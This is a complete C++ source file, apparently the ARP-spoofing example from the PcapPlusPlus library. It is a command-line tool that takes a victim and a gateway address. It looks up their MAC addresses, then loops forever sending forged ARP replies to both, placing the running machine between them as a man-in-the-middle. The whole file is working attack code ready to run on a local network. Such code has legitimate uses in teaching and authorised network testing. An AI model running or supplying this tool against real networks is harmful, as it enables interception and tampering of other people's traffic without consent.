#include <stdio.h>
#include <stdlib.h>
#include <fstream>
#include <memory>
#if defined(WIN32) || defined(WINx64)
#include <winsock2.h>
#endif
#include <MacAddress.h>
#include <IpAddress.h>
#include <PcapPlusPlusVersion.h>
#include <SystemUtils.h>
#include <PlatformSpecificUtils.h>
#include <PcapLiveDeviceList.h>
#include <PcapLiveDevice.h>
#include <EthLayer.h>
#include <ArpLayer.h>
#include <Logger.h>
#if !defined(WIN32) && !defined(WINx64) //for using ntohl, ntohs, etc.
#include <in.h>
#endif
#include <getopt.h>

using namespace std;
using namespace pcpp;

static struct option L3FwdOptions[] =
{
	{"interface",  required_argument, 0, 'i'},
	{"victim", required_argument, 0, 'c'},
	{"gateway", required_argument, 0, 'g'},
	{"help", no_argument, 0, 'h'},
	{"version", no_argument, 0, 'v'},
    {0, 0, 0, 0}
};


/**
 * Print application usage
 */
void printUsage() {
	printf("\nUsage:\n"
			"------\n"
			"%s [-hv] -i interface_ip -c victim_ip -g gateway_ip\n"
			"\nOptions:\n\n"
			"    -i interface_ip   : The IPv4 address of interface to use\n"
			"    -c victim_ip      : The IPv4 address of the victim\n"
			"    -g gateway_ip     : The IPv4 address of the gateway\n"
			"    -h                : Displays this help message and exits\n"
			"    -v                : Displays the current version and exists\n", AppName::get().c_str());
			
	exit(0);
}


/**
 * Print application version
 */
void printAppVersion()
{
	printf("%s %s\n", AppName::get().c_str(), getPcapPlusPlusVersionFull().c_str());
	printf("Built: %s\n", getBuildDateTime().c_str());
	printf("Built from: %s\n", getGitInfo().c_str());
	exit(0);
}


MacAddress getMacAddress(const IPv4Address& ipAddr, PcapLiveDevice* pDevice)
{
	// Create an ARP packet and change its fields
	Packet arpRequest(500);

	MacAddress macSrc = pDevice->getMacAddress();
	MacAddress macDst(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
	EthLayer ethLayer(macSrc, macDst, (uint16_t)PCPP_ETHERTYPE_ARP);
	ArpLayer arpLayer(ARP_REQUEST,
						pDevice->getMacAddress(),
						pDevice->getMacAddress(),
						pDevice->getIPv4Address(),
						ipAddr);


	arpRequest.addLayer(&ethLayer);
	arpRequest.addLayer(&arpLayer);
	arpRequest.computeCalculateFields();

	//setup arp reply filter
	ArpFilter arpFilter(ARP_REPLY);
	pDevice->setFilter(arpFilter);

	//send the arp request and wait for arp reply
	pDevice->sendPacket(&arpRequest);
	RawPacketVector capturedPackets;
	pDevice->startCapture(capturedPackets);
	PCAP_SLEEP(2);
	pDevice->stopCapture();

	if (capturedPackets.size() < 1)
	{
		printf("No arp reply was captured. Couldn't retrieve MAC address for IP %s\n", ipAddr.toString().c_str());
		return MacAddress("");
	}

	//parse arp reply and extract the MAC address
	Packet arpReply(capturedPackets.front());
	if (arpReply.isPacketOfType(ARP))
	{
		return arpReply.getLayerOfType<ArpLayer>()->getSenderMacAddress();
	}
	printf("No arp reply was captured. Couldn't retrieve MAC address for IP %s\n", ipAddr.toString().c_str());
	return MacAddress("");
}


bool doArpSpoofing(PcapLiveDevice* pDevice, const IPv4Address& gatewayAddr, const IPv4Address& victimAddr)
{
	// Get the gateway MAC address
	MacAddress gatewayMacAddr = getMacAddress(gatewayAddr, pDevice);
	if (!gatewayMacAddr.isValid())
	{
		printf("Failed to find gateway MAC address. Exiting...\n");
		return false;
	}
	printf("Got gateway MAC address: %s\n", gatewayMacAddr.toString().c_str());

	// Get the victim MAC address
	MacAddress victimMacAddr = getMacAddress(victimAddr, pDevice);
	if (!victimMacAddr.isValid())
	{
		printf("Failed to find victim MAC address. Exiting...\n");
		return false;
	}
	printf("Got victim MAC address: %s\n", victimMacAddr.toString().c_str());

	MacAddress deviceMacAddress = pDevice->getMacAddress();

	// Create ARP reply for the gateway
	Packet gwArpReply(500);
	EthLayer gwEthLayer(deviceMacAddress, gatewayMacAddr, (uint16_t)PCPP_ETHERTYPE_ARP);
	ArpLayer gwArpLayer(ARP_REPLY,
						pDevice->getMacAddress(),
						gatewayMacAddr,
						victimAddr,
						gatewayAddr);
	gwArpReply.addLayer(&gwEthLayer);
	gwArpReply.addLayer(&gwArpLayer);
	gwArpReply.computeCalculateFields();

	// Create ARP reply for the victim
	Packet victimArpReply(500);
	EthLayer victimEthLayer(deviceMacAddress, victimMacAddr, (uint16_t)PCPP_ETHERTYPE_ARP);
	ArpLayer victimArpLayer(ARP_REPLY,
							pDevice->getMacAddress(),
							victimMacAddr,
							gatewayAddr,
							victimAddr);
	victimArpReply.addLayer(&victimEthLayer);
	victimArpReply.addLayer(&victimArpLayer);
	victimArpReply.computeCalculateFields();

	// Send ARP replies to gateway and to victim every 5 seconds
	printf("Sending ARP replies to victim and to gateway every 5 seconds...\n\n");
	while(true)
	{
		pDevice->sendPacket(&gwArpReply);
		printf("Sent ARP reply: %s [gateway] is at MAC address %s [me]\n", gatewayAddr.toString().c_str(), deviceMacAddress.toString().c_str());
		pDevice->sendPacket(&victimArpReply);
		printf("Sent ARP reply: %s [victim] is at MAC address %s [me]\n\n", victimAddr.toString().c_str(), deviceMacAddress.toString().c_str());
		PCAP_SLEEP(5);
	}

	return true;
}


int main(int argc, char* argv[])
{
	AppName::init(argc, argv);

	//Get arguments from user for incoming interface and outgoing interface

	string iface = "", victim = "", gateway = "";
	int optionIndex = 0;
	char opt = 0;
	while((opt = getopt_long (argc, argv, "i:c:g:hv", L3FwdOptions, &optionIndex)) != -1)
	{
		switch (opt)
		{
			case 0:
				break;
			case 'i':
				iface = optarg;
				break;
			case 'c':
				victim = optarg;
				break;
			case 'g':
				gateway = optarg;
				break;
			case 'h':
				printUsage();
				break;
			case 'v':
				printAppVersion();
				break;
			default:
				printUsage();
				exit(-1);
		}
	}

	//Both incoming and outgoing interfaces must be provided by user
	if(iface == "" || victim == "" || gateway == "")
	{
		printUsage();
		exit(-1);
	}

	//Currently supports only IPv4 addresses
	IPv4Address ifaceAddr(iface);
	IPv4Address victimAddr(victim);
	IPv4Address gatewayAddr(gateway);

	PcapLiveDevice* pIfaceDevice = PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIp(ifaceAddr);

	//Verifying interface is valid
	if (pIfaceDevice == NULL)
	{
		printf("Cannot find interface. Exiting...\n");
		exit(-1);
	}

	if (!victimAddr.isValid())
	{
		printf("Victim address not valid. Exiting...\n");
		exit(-1);
	}

	if (!gatewayAddr.isValid())
	{
		printf("Gateway address not valid. Exiting...\n");
		exit(-1);
	}

	//Opening interface device
	if (!pIfaceDevice->open())
	{
		printf("Cannot open interface. Exiting...\n");
		exit(-1);
	}

	return (!doArpSpoofing(pIfaceDevice, gatewayAddr, victimAddr));
}
